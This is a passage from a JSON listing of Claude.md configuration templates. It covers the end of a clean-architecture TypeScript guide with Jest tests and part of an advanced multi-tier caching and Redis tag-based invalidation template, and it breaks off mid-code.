userController.updateUser.bind(userController));\n\n// Error handling\napp.use(errorHandler);\n\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT, () => {\n  console.log(`Server running on port ${PORT}`);\n});\n```\n\n## Testing Strategy\n\n### Unit Tests\n```typescript\n// tests/unit/domain/entities/User.test.ts\nimport { User } from '../../../../src/domain/entities/User';\nimport { Email } from '../../../../src/domain/value-objects/Email';\nimport { UserId } from '../../../../src/domain/value-objects/UserId';\n\ndescribe('User Entity', () => {\n  describe('create', () => {\n    it('should create a new user with valid data', () => {\n      // Arrange\n      const email = new Email('john@example.com');\n      const name = 'John Doe';\n\n      // Act\n      const user = User.create(email, name);\n\n      // Assert\n      expect(user.email).toBe(email);\n      expect(user.name).toBe(name);\n      expect(user.isActive).toBe(true);\n      expect(user.domainEvents).toHaveLength(1);\n      expect(user.domainEvents[0].constructor.name).toBe('UserCreatedEvent');\n    });\n\n    it('should throw error when name is empty', () => {\n      // Arrange\n      const email = new Email('john@example.com');\n      const name = '';\n\n      // Act & Assert\n      expect(() => User.create(email, name)).toThrow('User name cannot be empty');\n    });\n  });\n\n  describe('updateEmail', () => {\n    it('should update email and raise domain event', () => {\n      // Arrange\n      const user = User.create(new Email('john@example.com'), 'John Doe');\n      user.clearDomainEvents(); // Clear creation event\n      const newEmail = new Email('john.doe@example.com');\n\n      // Act\n      user.updateEmail(newEmail);\n\n      // Assert\n      expect(user.email).toBe(newEmail);\n      expect(user.domainEvents).toHaveLength(1);\n      expect(user.domainEvents[0].constructor.name).toBe('UserEmailUpdatedEvent');\n    });\n  });\n});\n```\n\n### Integration Tests\n```typescript\n// tests/integration/use-cases/CreateUser.test.ts\nimport { CreateUserUseCase } from '../../../src/application/use-cases/CreateUser';\nimport { UserRepositoryImpl } from '../../../src/infrastructure/database/UserRepositoryImpl';\nimport { TestDatabase } from '../../helpers/TestDatabase';\n\ndescribe('CreateUser Use Case Integration', () => {\n  let testDb: TestDatabase;\n  let userRepository: UserRepositoryImpl;\n  let createUserUseCase: CreateUserUseCase;\n\n  beforeAll(async () => {\n    testDb = new TestDatabase();\n    await testDb.setup();\n    userRepository = new UserRepositoryImpl(testDb.prisma);\n  });\n\n  afterAll(async () => {\n    await testDb.cleanup();\n  });\n\n  beforeEach(async () => {\n    await testDb.clearDatabase();\n    \n    const userDomainService = new UserDomainService(userRepository);\n    const mockEventPublisher = {\n      publish: jest.fn()\n    };\n    \n    createUserUseCase = new CreateUserUseCase(\n      userRepository,\n      userDomainService,\n      mockEventPublisher\n    );\n  });\n\n  it('should create user successfully', async () => {\n    // Arrange\n    const createUserDto = {\n      email: 'john@example.com',\n      name: 'John Doe'\n    };\n\n    // Act\n    const result = await createUserUseCase.execute(createUserDto);\n\n    // Assert\n    expect(result.email).toBe(createUserDto.email);\n    expect(result.name).toBe(createUserDto.name);\n    expect(result.isActive).toBe(true);\n\n    // Verify persistence\n    const savedUser = await userRepository.findByEmail(new Email(createUserDto.email));\n    expect(savedUser).toBeTruthy();\n  });\n\n  it('should throw error when email already exists', async () => {\n    // Arrange\n    const createUserDto = {\n      email: 'john@example.com',\n      name: 'John Doe'\n    };\n\n    await createUserUseCase.execute(createUserDto);\n\n    // Act & Assert\n    await expect(createUserUseCase.execute(createUserDto))\n      .rejects\n      .toThrow('Email already exists');\n  });\n});\n```\n\n## Benefits of This Architecture\n\n### 1. Testability\n- Domain logic is isolated and easily testable\n- Dependencies are injected, allowing for easy mocking\n- Clear separation enables focused unit tests\n\n### 2. Maintainability\n- Changes in one layer don't affect others\n- Business rules are centralized in the domain layer\n- Clear boundaries make the codebase easier to navigate\n\n### 3. Flexibility\n- Can switch databases without changing business logic\n- Can add new presentation layers (GraphQL, CLI) easily\n- External services can be swapped without affecting core logic\n\n### 4. Scalability\n- Clear architecture supports team growth\n- Domain-driven design enables multiple bounded contexts\n- Microservices can be extracted following the same patterns\n\n## Best Practices\n\n### Domain Layer\n- Keep domain entities rich with behavior\n- Use value objects for data validation\n- Raise domain events for important business changes\n- Keep dependencies pointing inward only\n\n### Application Layer\n- Use cases should be thin orchestrators\n- Handle cross-cutting concerns (transactions, events)\n- Transform between domain objects and DTOs\n- Don't put business logic in use cases\n\n### Infrastructure Layer\n- Implement interfaces defined in inner layers\n- Handle technical details (database, external APIs)\n- Configuration should live here\n- Error handling for technical failures\n\n### Testing Strategy\n- Write comprehensive unit tests for domain logic\n- Integration tests for use cases and repositories\n- End-to-end tests for critical user journeys\n- Use test doubles for external dependencies",
      "tags": [
        {
          "tag": {
            "id": "clean-architecture",
            "name": "clean-architecture",
            "slug": "clean-architecture"
          }
        },
        {
          "tag": {
            "id": "hexagonal-architecture",
            "name": "hexagonal-architecture",
            "slug": "hexagonal-architecture"
          }
        },
        {
          "tag": {
            "id": "domain-driven-design",
            "name": "domain-driven-design",
            "slug": "domain-driven-design"
          }
        },
        {
          "tag": {
            "id": "dependency-injection",
            "name": "dependency-injection",
            "slug": "dependency-injection"
          }
        },
        {
          "tag": {
            "id": "solid-principles",
            "name": "solid-principles",
            "slug": "solid-principles"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 12,
        "copies": 145
      },
      "_count": {
        "votes": 42,
        "copies": 180
      },
      "difficulty": "ADVANCED",
      "language": "TypeScript",
      "framework": "Node.js + Domain-Driven Design",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "advanced-caching-strategies",
      "title": "Advanced Caching Strategies + Distributed Systems",
      "slug": "advanced-caching-strategies-distributed-systems",
      "tagline": "Redis + CDN + Application Cache configuration for advanced developers",
      "description": "Comprehensive caching architecture with distributed caching, invalidation strategies, cache patterns, performance optimization, and multi-tier caching systems for high-performance applications.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Advanced Caching Strategies + Distributed Systems\n\n## Project Overview\n\nThis is an advanced caching architecture designed for building high-performance, scalable applications with sophisticated caching strategies. It covers distributed caching systems, intelligent cache invalidation, cache patterns, performance optimization, and multi-tier caching architectures that can handle massive scale while maintaining consistency and optimal performance.\n\n## Caching Philosophy\n\n### Core Principles\n1. **Cache Early, Cache Often**: Implement caching at every appropriate layer\n2. **Intelligent Invalidation**: Smart cache invalidation strategies to maintain consistency\n3. **Data Locality**: Keep frequently accessed data close to consumers\n4. **Cache Hierarchy**: Multi-level caching from CPU to CDN\n5. **Performance Monitoring**: Comprehensive cache performance analytics\n6. **Graceful Degradation**: System continues to function when cache fails\n7. **Cost Optimization**: Balance cache hit rates with infrastructure costs\n\n### Caching Layers\n- **Browser Cache**: Client-side caching for static assets\n- **CDN Cache**: Global edge caching for content distribution\n- **Load Balancer Cache**: Request-level caching at proxy layer\n- **Application Cache**: In-memory application-level caching\n- **Distributed Cache**: Shared cache across multiple application instances\n- **Database Cache**: Query result caching and buffer pools\n- **Disk Cache**: Persistent caching for larger datasets\n\n## Technology Stack\n\n- **Distributed Cache**: Redis Cluster, Hazelcast, Apache Ignite\n- **CDN**: CloudFlare, AWS CloudFront, Azure CDN\n- **In-Memory Cache**: Node.js LRU-cache, Caffeine (Java)\n- **Database Cache**: PostgreSQL shared_buffers, MySQL Query Cache\n- **Message Queues**: Redis Pub/Sub, Apache Kafka for invalidation\n- **Monitoring**: Prometheus + Grafana for cache metrics\n- **Load Testing**: Artillery, k6 for cache performance testing\n\n## Project Structure\n\n```\nadvanced-caching-system/\n├── src/\n│   ├── cache/                         # Cache implementations\n│   │   ├── adapters/                  # Cache adapter interfaces\n│   │   │   ├── CacheAdapter.ts        # Base cache adapter interface\n│   │   │   ├── RedisCacheAdapter.ts   # Redis implementation\n│   │   │   ├── MemoryCacheAdapter.ts  # In-memory implementation\n│   │   │   ├── HazelcastAdapter.ts    # Hazelcast implementation\n│   │   │   └── CompositeCacheAdapter.ts # Multi-tier cache\n│   │   ├── strategies/                # Caching strategies\n│   │   │   ├── WriteThrough.ts        # Write-through strategy\n│   │   │   ├── WriteBack.ts           # Write-back strategy\n│   │   │   ├── WriteAround.ts         # Write-around strategy\n│   │   │   ├── CacheAside.ts          # Cache-aside pattern\n│   │   │   └── RefreshAhead.ts        # Refresh-ahead strategy\n│   │   ├── invalidation/              # Cache invalidation\n│   │   │   ├── TagBasedInvalidation.ts # Tag-based invalidation\n│   │   │   ├── TimeBasedInvalidation.ts # TTL-based invalidation\n│   │   │   ├── EventDrivenInvalidation.ts # Event-driven invalidation\n│   │   │   ├── DependencyInvalidation.ts # Dependency-based invalidation\n│   │   │   └── ManualInvalidation.ts  # Manual invalidation\n│   │   ├── patterns/                  # Cache patterns\n│   │   │   ├── ReadThrough.ts         # Read-through caching\n│   │   │   ├── LookAside.ts           # Look-aside caching\n│   │   │   ├── WriteBehind.ts         # Write-behind caching\n│   │   │   ├── ReplicatedCache.ts     # Replicated caching\n│   │   │   └── PartitionedCache.ts    # Partitioned caching\n│   │   ├── consistency/               # Cache consistency\n│   │   │   ├── EventualConsistency.ts # Eventual consistency\n│   │   │   ├── StrongConsistency.ts   # Strong consistency\n│   │   │   ├── CausalConsistency.ts   # Causal consistency\n│   │   │   └── SessionConsistency.ts  # Session consistency\n│   │   └── serialization/             # Data serialization\n│   │       ├── JsonSerializer.ts      # JSON serialization\n│   │       ├── MessagePackSerializer.ts # MessagePack serialization\n│   │       ├── CompressedSerializer.ts # Compression support\n│   │       └── CustomSerializer.ts    # Custom serialization\n│   ├── distributed/                   # Distributed caching\n│   │   ├── cluster/                   # Cluster management\n│   │   │   ├── RedisCluster.ts        # Redis cluster setup\n│   │   │   ├── ConsistentHashing.ts   # Consistent hashing\n│   │   │   ├── NodeDiscovery.ts       # Node discovery\n│   │   │   └── FailoverManager.ts     # Failover handling\n│   │   ├── replication/               # Cache replication\n│   │   │   ├── MasterSlave.ts         # Master-slave replication\n│   │   │   ├── MasterMaster.ts        # Master-master replication\n│   │   │   ├── AsyncReplication.ts    # Asynchronous replication\n│   │   │   └── SyncReplication.ts     # Synchronous replication\n│   │   ├── partitioning/              # Data partitioning\n│   │   │   ├── HashPartitioning.ts    # Hash-based partitioning\n│   │   │   ├── RangePartitioning.ts   # Range-based partitioning\n│   │   │   ├── ConsistentHashing.ts   # Consistent hashing\n│   │   │   └── VirtualNodes.ts        # Virtual node management\n│   │   └── synchronization/           # Cache synchronization\n│   │       ├── EventualSync.ts        # Eventual synchronization\n│   │       ├── VectorClocks.ts        # Vector clock implementation\n│   │       ├── MerkleTree.ts          # Merkle tree synchronization\n│   │       └── AntiEntropy.ts         # Anti-entropy protocols\n│   ├── performance/                   # Performance optimization\n│   │   ├── optimization/              # Cache optimization\n│   │   │   ├── HitRateOptimizer.ts    # Hit rate optimization\n│   │   │   ├── MemoryOptimizer.ts     # Memory usage optimization\n│   │   │   ├── NetworkOptimizer.ts    # Network usage optimization\n│   │   │   └── LatencyOptimizer.ts    # Latency optimization\n│   │   ├── warming/                   # Cache warming\n│   │   │   ├── PreloadingStrategy.ts  # Cache preloading\n│   │   │   ├── PredictiveWarming.ts   # Predictive cache warming\n│   │   │   ├── ScheduledWarming.ts    # Scheduled cache warming\n│   │   │   └── LazyWarming.ts         # Lazy cache warming\n│   │   ├── eviction/                  # Eviction policies\n│   │   │   ├── LRUEviction.ts         # Least Recently Used\n│   │   │   ├── LFUEviction.ts         # Least Frequently Used\n│   │   │   ├── TTLEviction.ts         # Time To Live\n│   │   │   ├── RandomEviction.ts      # Random eviction\n│   │   │   └── CustomEviction.ts      # Custom eviction policies\n│   │   └── compression/               # Data compression\n│   │       ├── GzipCompression.ts     # GZIP compression\n│   │       ├── LZ4Compression.ts      # LZ4 compression\n│   │       ├── SnappyCompression.ts   # Snappy compression\n│   │       └── AdaptiveCompression.ts # Adaptive compression\n│   ├── monitoring/                    # Cache monitoring\n│   │   ├── metrics/                   # Metrics collection\n│   │   │   ├── CacheMetrics.ts        # Cache performance metrics\n│   │   │   ├── LatencyMetrics.ts      # Latency monitoring\n│   │   │   ├── ThroughputMetrics.ts   # Throughput monitoring\n│   │   │   └── ErrorMetrics.ts        # Error rate monitoring\n│   │   ├── alerting/                  # Alert system\n│   │   │   ├── HitRateAlerts.ts       # Hit rate alerts\n│   │   │   ├── LatencyAlerts.ts       # Latency alerts\n│   │   │   ├── MemoryAlerts.ts        # Memory usage alerts\n│   │   │   └── ErrorRateAlerts.ts     # Error rate alerts\n│   │   ├── dashboards/                # Monitoring dashboards\n│   │   │   ├── GrafanaDashboard.json  # Grafana dashboard config\n│   │   │   ├── PrometheusConfig.yml   # Prometheus configuration\n│   │   │   └── AlertRules.yml         # Alert rule definitions\n│   │   └── profiling/                 # Performance profiling\n│   │       ├── CacheProfiler.ts       # Cache performance profiler\n│   │       ├── MemoryProfiler.ts      # Memory usage profiler\n│   │       └── NetworkProfiler.ts     # Network usage profiler\n│   ├── cdn/                           # CDN integration\n│   │   ├── providers/                 # CDN providers\n│   │   │   ├── CloudFlareCDN.ts       # CloudFlare integration\n│   │   │   ├── AmazonCloudFront.ts    # AWS CloudFront\n│   │   │   ├── AzureCDN.ts            # Azure CDN\n│   │   │   └── GenericCDN.ts          # Generic CDN interface\n│   │   ├── strategies/                # CDN strategies\n│   │   │   ├── EdgeCaching.ts         # Edge caching strategy\n│   │   │   ├── GeoReplication.ts      # Geographic replication\n│   │   │   ├── PurgeStrategy.ts       # Cache purging strategy\n│   │   │   └── WarmupStrategy.ts      # CDN warmup strategy\n│   │   └── optimization/              # CDN optimization\n│   │       ├── CompressionStrategy.ts # Asset compression\n│   │       ├── MinificationStrategy.ts # Asset minification\n│   │       ├── ImageOptimization.ts   # Image optimization\n│   │       └── AssetBundling.ts       # Asset bundling\n│   └── testing/                       # Cache testing\n│       ├── unit/                      # Unit tests\n│       │   ├── CacheAdapter.test.ts   # Cache adapter tests\n│       │   ├── Invalidation.test.ts   # Invalidation tests\n│       │   └── Consistency.test.ts    # Consistency tests\n│       ├── integration/               # Integration tests\n│       │   ├── DistributedCache.test.ts # Distributed cache tests\n│       │   ├── CDNIntegration.test.ts # CDN integration tests\n│       │   └── PerformanceTest.ts     # Performance tests\n│       ├── load-testing/              # Load testing\n│       │   ├── CacheLoadTest.js       # Cache load testing\n│       │   ├── ThroughputTest.js      # Throughput testing\n│       │   └── LatencyTest.js         # Latency testing\n│       └── chaos/                     # Chaos engineering\n│           ├── CacheFailure.ts        # Cache failure simulation\n│           ├── NetworkPartition.ts    # Network partition tests\n│           └── NodeFailure.ts         # Node failure simulation\n├── config/                            # Configuration files\n│   ├── redis/                         # Redis configurations\n│   │   ├── redis-cluster.conf         # Redis cluster config\n│   │   ├── redis-sentinel.conf        # Redis Sentinel config\n│   │   └── redis-single.conf          # Single Redis instance\n│   ├── hazelcast/                     # Hazelcast configurations\n│   │   ├── hazelcast-cluster.xml      # Hazelcast cluster config\n│   │   └── hazelcast-client.xml       # Hazelcast client config\n│   ├── cdn/                           # CDN configurations\n│   │   ├── cloudflare-config.json     # CloudFlare configuration\n│   │   ├── cloudfront-config.json     # AWS CloudFront config\n│   │   └── azure-cdn-config.json      # Azure CDN config\n│   └── monitoring/                    # Monitoring configurations\n│       ├── prometheus.yml             # Prometheus config\n│       ├── grafana-dashboards/        # Grafana dashboards\n│       └── alert-rules.yml            # Alert rules\n├── scripts/                           # Utility scripts\n│   ├── setup/                         # Setup scripts\n│   │   ├── setup-redis-cluster.sh     # Redis cluster setup\n│   │   ├── setup-monitoring.sh        # Monitoring setup\n│   │   └── setup-cdn.sh               # CDN setup\n│   ├── maintenance/                   # Maintenance scripts\n│   │   ├── cache-warmup.ts            # Cache warming script\n│   │   ├── cache-analysis.ts          # Cache analysis script\n│   │   └── cleanup-expired.ts         # Expired data cleanup\n│   └── benchmarks/                    # Benchmark scripts\n│       ├── cache-performance.ts       # Cache performance benchmark\n│       ├── latency-benchmark.ts       # Latency benchmark\n│       └── throughput-benchmark.ts    # Throughput benchmark\n├── docs/                              # Documentation\n│   ├── architecture.md                # Architecture documentation\n│   ├── cache-patterns.md              # Cache pattern guide\n│   ├── performance-tuning.md          # Performance tuning guide\n│   ├── troubleshooting.md             # Troubleshooting guide\n│   └── best-practices.md              # Best practices guide\n└── examples/                          # Implementation examples\n    ├── e-commerce/                    # E-commerce caching example\n    ├── social-media/                  # Social media caching\n    ├── analytics/                     # Analytics caching\n    └── api-gateway/                   # API gateway caching\n```\n\n## Advanced Cache Implementation\n\n### Multi-Tier Cache Architecture\n```typescript\n// src/cache/adapters/CompositeCacheAdapter.ts\nimport { EventEmitter } from 'events';\n\nexport interface CacheAdapter<T = any> {\n  get(key: string): Promise<T | null>;\n  set(key: string, value: T, ttl?: number): Promise<void>;\n  delete(key: string): Promise<void>;\n  exists(key: string): Promise<boolean>;\n  flush(): Promise<void>;\n  getMetrics(): CacheMetrics;\n}\n\nexport interface CacheMetrics {\n  hits: number;\n  misses: number;\n  hitRate: number;\n  operations: number;\n  errors: number;\n  avgLatency: number;\n  memoryUsage: number;\n  keyCount: number;\n}\n\nexport interface CacheTier {\n  name: string;\n  adapter: CacheAdapter;\n  priority: number;\n  capacity: number;\n  ttl: number;\n  readThrough: boolean;\n  writeThrough: boolean;\n}\n\nexport class CompositeCacheAdapter<T = any> extends EventEmitter implements CacheAdapter<T> {\n  private tiers: CacheTier[] = [];\n  private metrics: Map<string, CacheMetrics> = new Map();\n  private isReading = new Map<string, Promise<T | null>>();\n\n  constructor(tiers: CacheTier[]) {\n    super();\n    this.tiers = tiers.sort((a, b) => a.priority - b.priority);\n    this.initializeMetrics();\n  }\n\n  private initializeMetrics(): void {\n    this.tiers.forEach(tier => {\n      this.metrics.set(tier.name, {\n        hits: 0,\n        misses: 0,\n        hitRate: 0,\n        operations: 0,\n        errors: 0,\n        avgLatency: 0,\n        memoryUsage: 0,\n        keyCount: 0\n      });\n    });\n  }\n\n  async get(key: string): Promise<T | null> {\n    // Prevent cache stampede by deduplicating concurrent reads\n    if (this.isReading.has(key)) {\n      return this.isReading.get(key)!;\n    }\n\n    const readPromise = this.performGet(key);\n    this.isReading.set(key, readPromise);\n\n    try {\n      const result = await readPromise;\n      return result;\n    } finally {\n      this.isReading.delete(key);\n    }\n  }\n\n  private async performGet(key: string): Promise<T | null> {\n    const startTime = Date.now();\n    \n    // Try each cache tier in priority order\n    for (let i = 0; i < this.tiers.length; i++) {\n      const tier = this.tiers[i];\n      const tierStartTime = Date.now();\n      \n      try {\n        const value = await tier.adapter.get(key);\n        const latency = Date.now() - tierStartTime;\n        \n        if (value !== null) {\n          // Cache hit - update metrics\n          this.updateMetrics(tier.name, true, latency);\n          \n          // Populate higher-priority tiers (cache promotion)\n          await this.promoteToHigherTiers(key, value, i);\n          \n          this.emit('cache:hit', {\n            key,\n            tier: tier.name,\n            priority: tier.priority,\n            latency: Date.now() - startTime\n          });\n          \n          return value;\n        } else {\n          // Cache miss for this tier\n          this.updateMetrics(tier.name, false, latency);\n        }\n      } catch (error) {\n        // Handle cache tier error\n        this.handleTierError(tier.name, error, latency);\n        this.emit('cache:error', {\n          key,\n          tier: tier.name,\n          error: error.message\n        });\n      }\n    }\n\n    // Complete cache miss\n    this.emit('cache:miss', {\n      key,\n      totalLatency: Date.now() - startTime\n    });\n\n    return null;\n  }\n\n  async set(key: string, value: T, ttl?: number): Promise<void> {\n    const writePromises: Promise<void>[] = [];\n    \n    // Write to all tiers based on their write-through configuration\n    this.tiers.forEach(tier => {\n      if (tier.writeThrough) {\n        const effectiveTtl = ttl || tier.ttl;\n        writePromises.push(\n          this.writeTier(tier, key, value, effectiveTtl)\n        );\n      }\n    });\n\n    // Wait for all writes to complete (or handle failures gracefully)\n    const results = await Promise.allSettled(writePromises);\n    \n    // Log any write failures\n    results.forEach((result, index) => {\n      if (result.status === 'rejected') {\n        const tier = this.tiers.filter(t => t.writeThrough)[index];\n        this.emit('cache:write-error', {\n          key,\n          tier: tier?.name,\n          error: result.reason\n        });\n      }\n    });\n\n    this.emit('cache:set', { key, value, ttl });\n  }\n\n  private async writeTier(tier: CacheTier, key: string, value: T, ttl: number): Promise<void> {\n    const startTime = Date.now();\n    \n    try {\n      await tier.adapter.set(key, value, ttl);\n      this.updateMetrics(tier.name, true, Date.now() - startTime, 'write');\n    } catch (error) {\n      this.handleTierError(tier.name, error, Date.now() - startTime);\n      throw error;\n    }\n  }\n\n  private async promoteToHigherTiers(key: string, value: T, fromTierIndex: number): Promise<void> {\n    // Promote value to higher-priority tiers\n    const promotionPromises: Promise<void>[] = [];\n    \n    for (let i = 0; i < fromTierIndex; i++) {\n      const tier = this.tiers[i];\n      promotionPromises.push(\n        this.writeTier(tier, key, value, tier.ttl).catch(error => {\n          // Log promotion errors but don't fail the read\n          this.emit('cache:promotion-error', {\n            key,\n            tier: tier.name,\n            error: error.message\n          });\n        })\n      );\n    }\n\n    // Execute promotions in parallel\n    await Promise.allSettled(promotionPromises);\n  }\n\n  async delete(key: string): Promise<void> {\n    const deletePromises = this.tiers.map(tier => \n      tier.adapter.delete(key).catch(error => {\n        this.emit('cache:delete-error', {\n          key,\n          tier: tier.name,\n          error: error.message\n        });\n      })\n    );\n\n    await Promise.allSettled(deletePromises);\n    this.emit('cache:delete', { key });\n  }\n\n  async exists(key: string): Promise<boolean> {\n    // Check existence in priority order\n    for (const tier of this.tiers) {\n      try {\n        const exists = await tier.adapter.exists(key);\n        if (exists) {\n          return true;\n        }\n      } catch (error) {\n        // Continue checking other tiers\n        continue;\n      }\n    }\n    return false;\n  }\n\n  async flush(): Promise<void> {\n    const flushPromises = this.tiers.map(tier =>\n      tier.adapter.flush().catch(error => {\n        this.emit('cache:flush-error', {\n          tier: tier.name,\n          error: error.message\n        });\n      })\n    );\n\n    await Promise.allSettled(flushPromises);\n    this.initializeMetrics(); // Reset metrics\n    this.emit('cache:flush');\n  }\n\n  getMetrics(): CacheMetrics {\n    // Aggregate metrics across all tiers\n    const aggregated: CacheMetrics = {\n      hits: 0,\n      misses: 0,\n      hitRate: 0,\n      operations: 0,\n      errors: 0,\n      avgLatency: 0,\n      memoryUsage: 0,\n      keyCount: 0\n    };\n\n    let totalLatency = 0;\n    \n    this.metrics.forEach((metrics) => {\n      aggregated.hits += metrics.hits;\n      aggregated.misses += metrics.misses;\n      aggregated.operations += metrics.operations;\n      aggregated.errors += metrics.errors;\n      aggregated.memoryUsage += metrics.memoryUsage;\n      aggregated.keyCount += metrics.keyCount;\n      totalLatency += metrics.avgLatency * metrics.operations;\n    });\n\n    aggregated.hitRate = aggregated.operations > 0 \n      ? (aggregated.hits / aggregated.operations) * 100 \n      : 0;\n    \n    aggregated.avgLatency = aggregated.operations > 0 \n      ? totalLatency / aggregated.operations \n      : 0;\n\n    return aggregated;\n  }\n\n  getTierMetrics(tierName: string): CacheMetrics | null {\n    return this.metrics.get(tierName) || null;\n  }\n\n  private updateMetrics(tierName: string, hit: boolean, latency: number, operation: 'read' | 'write' = 'read'): void {\n    const metrics = this.metrics.get(tierName);\n    if (!metrics) return;\n\n    metrics.operations++;\n    \n    if (hit) {\n      metrics.hits++;\n    } else {\n      metrics.misses++;\n    }\n\n    metrics.hitRate = (metrics.hits / metrics.operations) * 100;\n    \n    // Update average latency (exponential moving average)\n    const alpha = 0.1; // Smoothing factor\n    metrics.avgLatency = alpha * latency + (1 - alpha) * metrics.avgLatency;\n  }\n\n  private handleTierError(tierName: string, error: any, latency: number): void {\n    const metrics = this.metrics.get(tierName);\n    if (metrics) {\n      metrics.errors++;\n      metrics.operations++;\n    }\n\n    console.error(`Cache tier ${tierName} error:`, error);\n  }\n\n  // Cache warming functionality\n  async warmCache(keys: string[], dataLoader: (key: string) => Promise<T>): Promise<void> {\n    const warmingPromises = keys.map(async (key) => {\n      try {\n        // Check if key already exists in any tier\n        const exists = await this.exists(key);\n        if (!exists) {\n          // Load data and populate cache\n          const data = await dataLoader(key);\n          if (data !== null && data !== undefined) {\n            await this.set(key, data);\n          }\n        }\n      } catch (error) {\n        this.emit('cache:warming-error', {\n          key,\n          error: error.message\n        });\n      }\n    });\n\n    await Promise.allSettled(warmingPromises);\n    this.emit('cache:warmed', { keys: keys.length });\n  }\n\n  // Health check functionality\n  async healthCheck(): Promise<{\n    healthy: boolean;\n    tiers: Array<{\n      name: string;\n      healthy: boolean;\n      latency: number;\n      error?: string;\n    }>;\n  }> {\n    const healthChecks = await Promise.allSettled(\n      this.tiers.map(async (tier) => {\n        const startTime = Date.now();\n        const testKey = `health-check-${Date.now()}`;\n        const testValue = 'health-check-value';\n        \n        try {\n          await tier.adapter.set(testKey, testValue, 10); // 10 second TTL\n          const retrieved = await tier.adapter.get(testKey);\n          await tier.adapter.delete(testKey);\n          \n          const latency = Date.now() - startTime;\n          \n          return {\n            name: tier.name,\n            healthy: retrieved === testValue,\n            latency\n          };\n        } catch (error) {\n          return {\n            name: tier.name,\n            healthy: false,\n            latency: Date.now() - startTime,\n            error: error.message\n          };\n        }\n      })\n    );\n\n    const results = healthChecks.map((result, index) => {\n      if (result.status === 'fulfilled') {\n        return result.value;\n      } else {\n        return {\n          name: this.tiers[index].name,\n          healthy: false,\n          latency: 0,\n          error: result.reason?.message || 'Unknown error'\n        };\n      }\n    });\n\n    const healthy = results.every(result => result.healthy);\n\n    return {\n      healthy,\n      tiers: results\n    };\n  }\n}\n```\n\n### Intelligent Cache Invalidation\n```typescript\n// src/cache/invalidation/TagBasedInvalidation.ts\nimport { EventEmitter } from 'events';\nimport Redis from 'ioredis';\n\nexport interface InvalidationEvent {\n  type: 'tag' | 'key' | 'pattern' | 'dependency';\n  target: string | string[];\n  reason: string;\n  timestamp: number;\n  source: string;\n}\n\nexport interface CacheTag {\n  key: string;\n  tags: string[];\n  dependencies: string[];\n  ttl: number;\n  createdAt: number;\n  lastAccessed: number;\n}\n\nexport class TagBasedInvalidationManager extends EventEmitter {\n  private redis: Redis;\n  private tagPrefix = 'cache:tag:';\n  private keyPrefix = 'cache:key:';\n  private dependencyPrefix = 'cache:dep:';\n  private invalidationQueue = 'cache:invalidation:queue';\n\n  constructor(redis: Redis) {\n    super();\n    this.redis = redis;\n    this.setupInvalidationWorker();\n  }\n\n  // Tag a cache entry with multiple tags\n  async tagCacheEntry(key: string, tags: string[], dependencies: string[] = [], ttl: number = 3600): Promise<void> {\n    const pipeline = this.redis.pipeline();\n    const now = Date.now();\n    \n    // Store the tag metadata\n    const tagInfo: CacheTag = {\n      key,\n      tags,\n      dependencies,\n      ttl,\n      createdAt: now,\n      lastAccessed: now\n    };\n    \n    pipeline.hset(`${this.keyPrefix}${key}`, tagInfo);\n    pipeline.expire(`${this.keyPrefix}${key}`, ttl);\n    \n    // Add key to each tag set\n    tags.forEach(tag => {\n      pipeline.sadd(`${this.tagPrefix}${tag}`, key);\n      pipeline.expire(`${this.tagPrefix}${tag}`, ttl * 2); // Tags live longer than keys\n    });\n    \n    // Set up dependencies\n    dependencies.forEach(dep => {\n      pipeline.sadd(`${this.dependencyPrefix}${dep}`, key);\n      pipeline.expire(`${this.dependencyPrefix}${dep}`, ttl * 2);\n    });\n    \n    await pipeline.exec();\n    \n    this.emit('cache:tagged', {\n      key,\n      tags,\n      dependencies,\n      ttl\n    });\n  }\n\n  // Invalidate all cache entries with specific tags\n  async invalidateByTags(tags: string[], reason: string = 'Tag invalidation'): Promise<string[]> {\n    const invalidatedKeys: string[] = [];\n    \n    for (const tag of tags) {\n      const keys = await this.redis.smembers(`${this.tagPrefix}${tag}`);\n      \n      if (keys.length > 0) {\n        // Queue invalidation for batch processing\n        await this.queueInvalidation({\n          type: 'tag',\n          target: tag,\n          reason,\n          timestamp: Date.now(),\n          source: 'tag-invalidation'\n        });\n        \n        invalidatedKeys.push(...keys);\n      }\n    }\n    \n    return [...new Set(invalidatedKeys)]; // Remove duplicates\n  }\n\n  // Invalidate by dependency\n  async invalidateByDependency(dependency: string, reason: string = 'Dependency change'): Promise<string[]> {\n    const keys = await this.redis.smembers(`${this.dependencyPrefix}${dependency}`);\n    \n    if (keys.length > 0) {\n      await this.queueInvalidation({\n        type: 'dependency',\n        target: dependency,\n        reason,\n        timestamp: Date.now(),\n        source: 'dependency-invalidation'\n      });\n    }\n    \n    return keys;\n  }\n\n  // Invalidate by key pattern\n  async invalidateByPattern(pattern: string, reason: string = 'Pattern invalidation'): Promise<string[]> {\n    const keys = await this.redis.keys(pattern);\n    \n    if (keys.length > 0) {\n      await this.queueInvalidation({\n        type: 'pattern',\n        target: pattern,\n        reason,\n        timestamp: Date.now(),\n        source: 'pattern-invalidation'\n      });\n    }\n    \n    return keys;\n  }\n\n  // Smart invalidation based on cache usage patterns\n  async smartInvalidation(analysisWindow: number = 3600000): Promise<{\n    coldKeys: string[];\n    hotKeys: string[];\n    recommendations: string[];\n  }> {\n    const now = Date.now();\n    const cutoff = now - analysisWindow;\n    \n    const coldKeys: string[] = [];\n    const hotKeys: string[] = [];\n    const recommendations: string[] = [];\n    \n    // Scan all cache keys for analysis\n    const keyPattern = `${this.keyPrefix}*`;\n    const stream = this.redis.scanStream({\n      match: keyPattern,\n      count: 100\n    });\n    \n    stream.on('data', async (keys: string[]) => {\n      for (const keyName of keys) {\n        try {\n          const tagInfo = await this.redis.hgetall(keyName) as unknown as CacheTag;\n          \n          if (tagInfo && tagInfo.lastAccessed) {\n            const lastAccessed = parseInt(tagInfo.lastAccessed.toString());\n            \n            if (lastAccessed < cutoff) {\n              coldKeys.push(tagInfo.key);\n            } else {\n              